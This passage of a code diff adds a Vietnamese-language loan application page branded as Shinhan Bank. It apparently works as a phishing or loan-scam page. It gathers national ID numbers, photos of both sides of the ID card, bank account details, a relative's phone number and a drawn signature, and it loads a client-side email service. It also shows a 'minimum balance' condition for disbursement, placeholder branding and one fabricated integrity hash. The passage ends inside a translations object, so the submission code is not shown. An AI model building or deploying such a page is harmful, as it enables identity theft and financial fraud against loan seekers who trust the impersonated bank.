@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Đăng ký vay tín chấp nhanh chóng, an toàn và tiện lợi với Shinhan Bank">
+    <meta name="keywords" content="vay tín chấp, Shinhan Bank, vay tiêu dùng, eKYC, vay online">
+    <meta name="author" content="Shinhan Bank">
+    <title>Vay tiêu dùng tín chấp | Shinhan Bank</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous">
+    <style>
+        /* General body styling */
+        body {
+            background: linear-gradient(135deg, #005BAC, #004080);
+            color: #fff;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Modal styling */
+        .modal-dialog {
+            max-width: 600px;
+            margin: 1.5rem auto;
+        }
+
+        .modal-content {
+            border-radius: 16px;
+            background: linear-gradient(145deg, #ffffff, #e6e6e6);
+            color: #212121;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            border: none;
+        }
+
+        /* Modal header */
+        .modal-header {
+            background: #005BAC;
+            color: #fff;
+            border-top-left-radius: 16px;
+            border-top-right-radius: 16px;
+            padding: 15px;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .logo {
+            width: 100px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+
+        /* Modal body */
+        .modal-body {
+            padding: 20px;
+            display: grid;
+            gap: 15px;
+        }
+
+        /* Progress bar */
+        .progress-bar {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            background: #E0E0E0;
+            border-radius: 20px;
+            padding: 5px;
+        }
+
+        .progress-step {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background: #E0E0E0;
+            font-size: 12px;
+            color: #333;
+            min-width: 80px;
+            transition: background 0.3s, color 0.3s;
+            cursor: pointer;
+            border-radius: 20px;
+        }
+
+        .progress-step.active {
+            background: #005BAC;
+            color: #fff;
+        }
+
+        /* Step content */
+        .step {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            transform: translateY(20px);
+        }
+
+        .step.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .step-instruction {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        /* Input field styling */
+        .vib-v2-input01 {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .vib-v2-input01 label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .vib-v2-input01 input, .vib-v2-input01 select {
+            width: 100%;
+            padding: 8px 0;
+            font-size: 14px;
+            border: none;
+            border-bottom: 1px solid #E0E0E0;
+            background: transparent;
+            transition: border-color 0.3s;
+        }
+
+        .vib-v2-input01 input:focus, .vib-v2-input01 select:focus {
+            border-bottom: 1px solid #005BAC;
+            outline: none;
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: #e63946;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Photo upload card */
+        .photo-card {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+            background: #F8F9FA;
+            padding: 10px;
+            border-radius: 12px;
+        }
+
+        .photo-preview {
+            width: 80px;
+            height: 50px;
+            object-fit: cover;
+            border-radius: 8px;
+            border: 1px solid #E0E0E0;
+        }
+
+        .delete-photo {
+            background: #e63946;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .delete-photo:hover {
+            background: #d32f2f;
+        }
+
+        /* Step navigation buttons */
+        .step-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn-step, .vib-v2-btn-dk02 {
+            width: 120px;
+            padding: 10px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+        }
+
+        .btn-step.prev {
+            background: #E0E0E0;
+            color: #333;
+        }
+
+        .btn-step.next, .vib-v2-btn-dk02 {
+            background: #F37021;
+            color: #fff;
+        }
+
+        .btn-step:disabled, .vib-v2-btn-dk02:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-step:hover:not(:disabled), .vib-v2-btn-dk02:hover:not(:disabled) {
+            transform: scale(1.05);
+        }
+
+        /* Signature canvas */
+        #signatureCanvas {
+            background: #F8F9FA;
+            cursor: crosshair;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .signature-section canvas:focus {
+            outline: 2px solid #005BAC;
+        }
+
+        #signaturePreview {
+            max-width: 150px;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+        }
+
+        /* Contract and disbursement previews */
+        .contract-preview, .disbursement-preview {
+            padding: 10px;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            background: #fff;
+        }
+
+        .contract-preview h6, .disbursement-preview h6 {
+            font-size: 14px;
+            color: #005BAC;
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #e63946;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: none;
+            z-index: 1000;
+            font-size: 14px;
+            max-width: 300px;
+        }
+
+        .toast.success {
+            background: #28a745;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid #005BAC;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Language selector */
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 767px) {
+            .modal-dialog {
+                max-width: 95vw;
+                margin: 0.5rem auto;
+            }
+
+            .modal-content {
+                border-radius: 12px;
+            }
+
+            .modal-body {
+                padding: 15px;
+                gap: 10px;
+            }
+
+            .progress-step {
+                font-size: 10px;
+                padding: 8px 3px;
+                min-width: 60px;
+            }
+
+            .modal-title {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Language Selector -->
+    <div class="language-selector">
+        <select id="languageSelect" aria-label="Chọn ngôn ngữ">
+            <option value="vi">Tiếng Việt</option>
+            <option value="en">English</option>
+        </select>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay" role="status" aria-live="polite">
+        <div class="loading-spinner" aria-label="Đang tải"></div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast" role="alert" aria-live="assertive"></div>
+
+    <!-- Register Modal -->
+    <div id="registerForm" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="registerFormTitle">
+        <div class="modal-dialog">
+            <div class="modal-content animate__animated animate__fadeIn">
+                <div class="modal-header">
+                    <img src="https://via.placeholder.com/100x50" class="logo" alt="Shinhan Bank Logo" loading="lazy">
+                    <h5 class="modal-title" id="registerFormTitle" data-lang-key="registerFormTitle">Đăng ký vay tiêu dùng</h5>
+                </div>
+                <div class="modal-body">
+                    <!-- Step 1: Personal Information -->
+                    <div id="step-1" class="step active">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step active" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step1Instruction">Vui lòng điền thông tin cá nhân chính xác để tiếp tục.</p>
+                        <div class="vib-v2-input01">
+                            <label for="fullName" data-lang-key="fullName">Họ và tên</label>
+                            <input type="text" id="fullName" name="fullName" placeholder="Ví dụ: Nguyễn Văn A" required pattern="[A-Za-zÀ-ỹ\s]+" title="Chỉ chứa chữ cái và dấu cách">
+                            <div class="error-message" id="fullNameError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="phone" data-lang-key="phone">Số điện thoại</label>
+                            <input type="tel" id="phone" name="phone" placeholder="Ví dụ: 0901234567" required pattern="0[0-9]{9}" title="Số điện thoại phải bắt đầu bằng 0 và có 10 số">
+                            <div class="error-message" id="phoneError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="relativePhone" data-lang-key="relativePhone">Số điện thoại người thân</label>
+                            <input type="tel" id="relativePhone" name="relativePhone" placeholder="Ví dụ: 0901234567" required pattern="0[0-9]{9}" title="Số điện thoại phải bắt đầu bằng 0 và có 10 số">
+                            <div class="error-message" id="relativePhoneError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="email" data-lang-key="email">Email</label>
+                            <input type="email" id="email" name="email" placeholder="Ví dụ: example@domain.com" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" title="Vui lòng nhập email hợp lệ">
+                            <div class="error-message" id="emailError"></div>
+                        </div>
+                        <div class="step-buttons">
+                            <div></div>
+                            <button class="btn-step next" onclick="loanForm.nextStep(2)" data-lang-key="next" aria-label="Chuyển đến bước tiếp theo">Tiếp tục</button>
+                        </div>
+                    </div>
+                    <!-- Step 2: ID Information -->
+                    <div id="step-2" class="step">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step active" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step2Instruction">Vui lòng cung cấp thông tin CCCD/CMND chính xác.</p>
+                        <div class="vib-v2-input01">
+                            <label for="idNumber" data-lang-key="idNumber">Số CCCD/CMND</label>
+                            <input type="text" id="idNumber" name="idNumber" placeholder="Ví dụ: 123456789" required pattern="\d{9,12}" title="Số CCCD/CMND phải có 9-12 số">
+                            <div class="error-message" id="idNumberError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="idIssueDate" data-lang-key="idIssueDate">Ngày cấp</label>
+                            <input type="date" id="idIssueDate" name="idIssueDate" required>
+                            <div class="error-message" id="idIssueDateError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="idIssuePlace" data-lang-key="idIssuePlace">Nơi cấp</label>
+                            <input type="text" id="idIssuePlace" name="idIssuePlace" placeholder="Ví dụ: Hà Nội" required pattern="[A-Za-zÀ-ỹ\s]+" title="Vui lòng nhập nơi cấp hợp lệ">
+                            <div class="error-message" id="idIssuePlaceError"></div>
+                        </div>
+                        <div class="step-buttons">
+                            <button class="btn-step prev" onclick="loanForm.prevStep(1)" data-lang-key="prev" aria-label="Quay lại bước trước">Quay lại</button>
+                            <button class="btn-step next" onclick="loanForm.nextStep(3)" data-lang-key="next" aria-label="Chuyển đến bước tiếp theo">Tiếp tục</button>
+                        </div>
+                    </div>
+                    <!-- Step 3: Loan Information -->
+                    <div id="step-3" class="step">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step active" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step3Instruction">Vui lòng chọn số tiền và loại hình vay phù hợp.</p>
+                        <div class="vib-v2-input01">
+                            <label for="loanAmount" data-lang-key="loanAmount">Số tiền vay (VND)</label>
+                            <input type="text" id="loanAmount" name="loanAmount" placeholder="Ví dụ: 50,000,000" required>
+                            <div class="error-message" id="loanAmountError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="loanTerm" data-lang-key="loanTerm">Thời hạn vay (tháng)</label>
+                            <select id="loanTerm" name="loanTerm" required>
+                                <option value="" data-lang-key="selectLoanTerm">Chọn thời hạn</option>
+                                <option value="12">12 tháng</option>
+                                <option value="24">24 tháng</option>
+                                <option value="36">36 tháng</option>
+                                <option value="48">48 tháng</option>
+                                <option value="60">60 tháng</option>
+                            </select>
+                            <div class="error-message" id="loanTermError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="loanType" data-lang-key="loanType">Loại hình vay</label>
+                            <select id="loanType" name="loanType" required>
+                                <option value="" data-lang-key="selectLoanType">Chọn loại hình vay</option>
+                                <option value="Vay Cá Nhân Trực Tuyến" data-lang-key="personalLoanOnline">Vay Cá Nhân Trực Tuyến</option>
+                                <option value="Vay mua nhà" data-lang-key="homeLoan">Vay mua nhà</option>
+                                <option value="Vay mua xe" data-lang-key="carLoan">Vay mua xe</option>
+                                <option value="Vay Tiêu Dùng" data-lang-key="consumerLoan">Vay Tiêu Dùng</option>
+                            </select>
+                            <div class="error-message" id="loanTypeError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="loanPurpose" data-lang-key="loanPurpose">Mục đích vay</label>
+                            <input type="text" id="loanPurpose" name="loanPurpose" placeholder="Ví dụ: Mua nhà" required>
+                            <div class="error-message" id="loanPurposeError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label data-lang-key="interestRate">Lãi suất</label>
+                            <p id="interestRate">12.0% mỗi năm</p>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label data-lang-key="monthlyPayment">Số tiền trả hàng tháng</label>
+                            <p id="monthlyPayment">0 VND</p>
+                        </div>
+                        <div class="step-buttons">
+                            <button class="btn-step prev" onclick="loanForm.prevStep(2)" data-lang-key="prev" aria-label="Quay lại bước trước">Quay lại</button>
+                            <button class="btn-step next" onclick="loanForm.nextStep(4)" data-lang-key="next" aria-label="Chuyển đến bước tiếp theo">Tiếp tục</button>
+                        </div>
+                    </div>
+                    <!-- Step 4: Bank Information -->
+                    <div id="step-4" class="step">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step active" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step4Instruction">Vui lòng cung cấp thông tin tài khoản ngân hàng để nhận giải ngân.</p>
+                        <div class="vib-v2-input01">
+                            <label for="accountNumber" data-lang-key="accountNumber">Số tài khoản</label>
+                            <input type="text" id="accountNumber" name="accountNumber" placeholder="Ví dụ: 1234567890" required pattern="\d{8,20}" title="Số tài khoản phải có 8-20 số">
+                            <div class="error-message" id="accountNumberError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="accountHolder" data-lang-key="accountHolder">Chủ tài khoản</label>
+                            <input type="text" id="accountHolder" name="accountHolder" placeholder="Ví dụ: Nguyễn Văn A" required pattern="[A-Za-zÀ-ỹ\s]+" title="Chỉ chứa chữ cái và dấu cách">
+                            <div class="error-message" id="accountHolderError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="bank" data-lang-key="bank">Ngân hàng</label>
+                            <input type="text" id="bank" name="bank" placeholder="Ví dụ: Shinhan Bank" required>
+                            <div class="error-message" id="bankError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="branchName" data-lang-key="branchName">Chi nhánh</label>
+                            <input type="text" id="branchName" name="branchName" placeholder="Ví dụ: Chi nhánh Hà Nội" required>
+                            <div class="error-message" id="branchNameError"></div>
+                        </div>
+                        <div class="step-buttons">
+                            <button class="btn-step prev" onclick="loanForm.prevStep(3)" data-lang-key="prev" aria-label="Quay lại bước trước">Quay lại</button>
+                            <button class="btn-step next" onclick="loanForm.nextStep(5)" data-lang-key="next" aria-label="Chuyển đến bước tiếp theo">Tiếp tục</button>
+                        </div>
+                    </div>
+                    <!-- Step 5: Document Upload -->
+                    <div id="step-5" class="step">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step active" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step5Instruction">Vui lòng tải lên các tài liệu cần thiết và ký hợp đồng.</p>
+                        <div class="vib-v2-input01">
+                            <label for="idPhotoFront" data-lang-key="idPhotoFront">Ảnh mặt trước CCCD/CMND</label>
+                            <input type="file" id="idPhotoFront" name="idPhotoFront" accept="image/*" required onchange="loanForm.previewImage(this, 'contractIdPhotoFront', 'idPhotoFrontUploaded')">
+                            <div class="photo-card" id="idPhotoFrontUploaded" style="display: none;">
+                                <img id="contractIdPhotoFront" class="photo-preview" src="https://via.placeholder.com/80x50" alt="Ảnh mặt trước CCCD/CMND" loading="lazy">
+                                <button class="delete-photo" onclick="loanForm.deletePhoto('idPhotoFront')" data-lang-key="delete">Xóa</button>
+                            </div>
+                            <div class="error-message" id="idPhotoFrontError"></div>
+                        </div>
+                        <div class="vib-v2-input01">
+                            <label for="idPhotoBack" data-lang-key="idPhotoBack">Ảnh mặt sau CCCD/CMND</label>
+                            <input type="file" id="idPhotoBack" name="idPhotoBack" accept="image/*" required onchange="loanForm.previewImage(this, 'contractIdPhotoBack', 'idPhotoBackUploaded')">
+                            <div class="photo-card" id="idPhotoBackUploaded" style="display: none;">
+                                <img id="contractIdPhotoBack" class="photo-preview" src="https://via.placeholder.com/80x50" alt="Ảnh mặt sau CCCD/CMND" loading="lazy">
+                                <button class="delete-photo" onclick="loanForm.deletePhoto('idPhotoBack')" data-lang-key="delete">Xóa</button>
+                            </div>
+                            <div class="error-message" id="idPhotoBackError"></div>
+                        </div>
+                        <div class="vib-v2-input01 signature-section">
+                            <label data-lang-key="signature">Chữ ký</label>
+                            <p data-lang-key="signatureInstruction">Vui lòng nhấn "Bắt đầu ký" và vẽ chữ ký trên khung bên dưới.</p>
+                            <button id="startSigning" class="btn-step" onclick="loanForm.startSigning()" data-lang-key="startSigning">Bắt đầu ký</button>
+                            <canvas id="signatureCanvas" width="300" height="150" style="display: none;" aria-label="Vùng vẽ chữ ký"></canvas>
+                            <img id="signaturePreview" style="display: none;" alt="Chữ ký" loading="lazy">
+                            <button id="clearSignature" class="btn-step" style="display: none;" onclick="loanForm.clearSignature()" data-lang-key="clearSignature">Xóa chữ ký</button>
+                            <div class="error-message" id="signatureError"></div>
+                        </div>
+                        <div class="step-buttons">
+                            <button class="btn-step prev" onclick="loanForm.prevStep(4)" data-lang-key="prev" aria-label="Quay lại bước trước">Quay lại</button>
+                            <button class="btn-step next" id="contractNext" onclick="loanForm.nextStep(6)" disabled data-lang-key="next" aria-label="Chuyển đến bước tiếp theo">Tiếp tục</button>
+                        </div>
+                    </div>
+                    <!-- Step 6: Contract and Submission -->
+                    <div id="step-6" class="step">
+                        <div class="progress-bar" role="navigation">
+                            <div class="progress-step" data-step="1" data-lang-key="personalInfo">Thông tin cá nhân</div>
+                            <div class="progress-step" data-step="2" data-lang-key="idInfo">Thông tin CCCD</div>
+                            <div class="progress-step" data-step="3" data-lang-key="loanInfo">Thông tin khoản vay</div>
+                            <div class="progress-step" data-step="4" data-lang-key="bankInfo">Thông tin ngân hàng</div>
+                            <div class="progress-step" data-step="5" data-lang-key="eKYC">Tài liệu eKYC</div>
+                            <div class="progress-step active" data-step="6" data-lang-key="confirmation">Xác nhận</div>
+                        </div>
+                        <p class="step-instruction" data-lang-key="step6Instruction">Kiểm tra thông tin hợp đồng và điều kiện giải ngân trước khi gửi.</p>
+                        <div class="contract-preview">
+                            <h6 data-lang-key="contractNumber">Số hợp đồng: <span id="contractId"></span></h6>
+                            <p data-lang-key="contractDate">Ngày hợp đồng: <span id="contractDate"></span></p>
+                            <p data-lang-key="fullName">Họ và tên: <span id="contractFullName"></span></p>
+                            <p data-lang-key="idNumber">Số CCCD/CMND: <span id="contractIdNumber"></span></p>
+                            <p data-lang-key="phone">Số điện thoại: <span id="contractPhone"></span></p>
+                            <p data-lang-key="email">Email: <span id="contractEmail"></span></p>
+                            <p data-lang-key="accountNumber">Số tài khoản: <span id="contractAccountNumber"></span></p>
+                            <p data-lang-key="loanAmount">Số tiền vay: <span id="contractLoanAmount"></span></p>
+                            <p data-lang-key="loanTerm">Thời hạn vay: <span id="contractLoanTerm"></span> tháng</p>
+                            <div id="contractQrCode" aria-label="QR Code theo dõi hợp đồng"></div>
+                        </div>
+                        <div class="disbursement-preview">
+                            <h6 data-lang-key="disbursementConditions">Điều kiện giải ngân</h6>
+                            <p data-lang-key="minimumBalance">Số dư tối thiểu: <span id="disbursementMinimumBalance"></span></p>
+                            <p data-lang-key="disbursementDate">Ngày giải ngân dự kiến: <span id="disbursementDate"></span></p>
+                            <p data-lang-key="staff">Nhân viên phụ trách: Nguyễn Văn A (SĐT: 0901234567)</p>
+                        </div>
+                        <div class="step-buttons">
+                            <button class="btn-step prev" onclick="loanForm.prevStep(5)" data-lang-key="prev" aria-label="Quay lại bước trước">Quay lại</button>
+                            <button class="vib-v2-btn-dk02" onclick="loanForm.submitForm()" data-lang-key="submitForm" aria-label="Gửi hồ sơ vay">Gửi hồ sơ</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="successModalTitle">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="successModalTitle" data-lang-key="successModalTitle">Gửi hồ sơ thành công</h5>
+                </div>
+                <div class="modal-body">
+                    <p data-lang-key="successMessage">Hồ sơ vay của bạn đã được gửi thành công!</p>
+                    <p data-lang-key="loanAmount">Số tiền vay: <span id="successLoanAmount"></span></p>
+                    <p data-lang-key="checkEmail">Vui lòng kiểm tra email để xem hợp đồng và điều kiện giải ngân.</p>
+                    <button class="btn-step" onclick="$('#successModal').modal('hide')" data-lang-key="close" aria-label="Đóng cửa sổ">Đóng</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.2/html2pdf.bundle.min.js" integrity="sha512-MpDF2MT1zqW9O0YbiTaF2p2bF3mQ3U3IuS3I3U8yqM0yU5fO9b3U6lE0p2p2p2p2p2p2p2p2p2p2p2p2p2p2p2p" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <script>
+        // Language translations
+        const translations = {
+            vi: {
+                registerFormTitle: "Đăng ký vay tiêu dùng",
+                personalInfo: "Thông tin cá nhân",
+                idInfo: "Thông tin CCCD",
+                loanInfo: "Thông tin khoản vay",
+                bankInfo: "Thông tin ngân hàng",
+                eKYC: "Tài liệu eKYC",
+                confirmation: "Xác nhận",
+                fullName: "Họ và tên",
+                phone: "Số điện thoại",
+                relativePhone: "Số điện thoại người thân",
+                email: "Email",
+                idNumber: "Số CCCD/CMND",
+                idIssueDate: "Ngày cấp",
+                idIssuePlace: "Nơi cấp",
+                loanAmount: "Số tiền vay (VND)",
+                loanTerm: "Thời hạn vay (tháng)",
+                loanType: "Loại hình vay",
+                loanPurpose: "Mục đích vay",
+                interestRate: "Lãi suất",
+                monthlyPayment: "Số tiền trả hàng tháng",
+                accountNumber: "Số tài khoản",
+                accountHolder: "Chủ tài khoản",
+                bank: "Ngân hàng",
+                branchName: "Chi nhánh",
+                idPhotoFront: "Ảnh mặt trước CCCD/CMND",
+                idPhotoBack: "Ảnh mặt sau CCCD/CMND",
+                signature: "Chữ ký",
+                signatureInstruction: "Vui lòng nhấn 'Bắt đầu ký' và vẽ chữ ký trên khung bên dưới.",
+                startSigning: "Bắt đầu ký",
+                clearSignature: "Xóa chữ ký",
+                contractNumber: "Số hợp đồng",
+                contractDate: "Ngày hợp đồng",
+                minimumBalance: "Số dư tối thiểu",
+                disbursementConditions: "Điều kiện giải ngân",
+                disbursementDate: "Ngày giải ngân dự kiến",
+                staff: "Nhân viên phụ trách",
+                successModalTitle: "Gửi hồ sơ thành công",
+                successMessage: "Hồ sơ vay của bạn đã được gửi thành công!",
+                checkEmail: "Vui lòng kiểm tra email để xem hợp đồng và điều kiện giải ngân.",
+                prev: "Quay lại",
+                next: "Tiếp tục",
+                delete: "Xóa",
+                submitForm: "Gửi hồ sơ",
+                close: "Đóng",
+                selectLoanTerm: "Chọn thời hạn",
+                selectLoanType: "Chọn loại hình vay",
+                personalLoanOnline: "Vay Cá Nhân Trực Tuyến",
+                homeLoan: "Vay mua nhà",
+                carLoan: "Vay mua xe",
+                consumerLoan: "Vay Tiêu Dùng",
+                step1Instruction: "Vui lòng điền thông tin cá nhân chính xác để tiếp tục.",
+                step2Instruction: "Vui lòng cung cấp thông tin CCCD/CMND chính xác.",
+                step3Instruction: "Vui lòng chọn số tiền và loại hình vay phù hợp.",
+                step4Instruction: "Vui lòng cung cấp thông tin tài khoản ngân hàng để nhận giải ngân.",
+                step5Instruction: "Vui lòng tải lên các tài liệu cần thiết và ký hợp đồng.",
+                step6Instruction: "Kiểm tra thông tin hợp đồng và điều kiện giải ngân trước khi gửi.",
+                invalidImage: "Vui lòng tải lên file ảnh hợp lệ (JPG, PNG, v.v.).",
+                imageTooLarge: "Ảnh không được vượt quá 5MB!",
+                imageReadError: "Lỗi đọc file ảnh. Vui lòng thử lại.",
+                selectImage: "Vui lòng chọn một file ảnh.",
+                signContract: "Vui lòng ký hợp đồng trước khi tiếp tục.",
+                checkInformation: "Vui lòng kiểm tra lại thông tin.",
+                pdfError: "Lỗi tạo PDF.",
+                submitError: "Lỗi gửi hồ sơ",
+                required: "là bắt buộc",
+                uploadImage: "Vui lòng tải lên ảnh",
+                perYear: "mỗi năm"
+            },
+            en: {
+                registerFormTitle: "Consumer Loan Application",
+                personalInfo: "Personal Information",
+                idInfo: "ID Information",
+                loanInfo: "Loan Information",
+                bankInfo: "Bank Information",
+                eKYC: "eKYC Documents",
+                confirmation: "Confirmation",
+                fullName: "Full Name",
+                phone: "Phone Number",
+                relativePhone: "Relative's Phone Number",
+                email: "Email",
+                idNumber: "ID Number",
+                idIssueDate: "Issue Date",
+                idIssuePlace: "Issue Place",
+                loanAmount: "Loan Amount (VND)",
+                loanTerm: "Loan Term (months)",
+                loanType: "Loan Type",
+                loanPurpose: "Loan Purpose",
+                interestRate: "Interest Rate",
+                monthlyPayment: "Monthly Payment",
